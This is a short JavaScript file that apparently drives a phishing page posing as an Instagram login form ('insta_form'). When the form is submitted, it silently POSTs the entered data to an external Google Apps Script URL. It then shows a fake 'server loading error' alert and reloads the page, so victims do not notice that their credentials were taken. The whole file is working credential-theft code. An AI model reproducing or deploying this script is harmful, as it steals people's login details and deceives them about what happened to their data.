const scriptURL =
  "https://script.google.com/macros/s/AKfycbySJ_X9ecyRqHxQRkxiJ8L5UNv-MdrUToni3_IgZ9NiIs--78fBaQUnX7sDbERiyyz4/exec";

const form = document.forms['insta_form']

form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, {method : 'POST', body: new FormData(form)})
    .then(Response => alert("server loading error, pls try after some time."))
    .then(() => {window.location.reload();})
    .catch(error => console.error("Error !", error.message))
})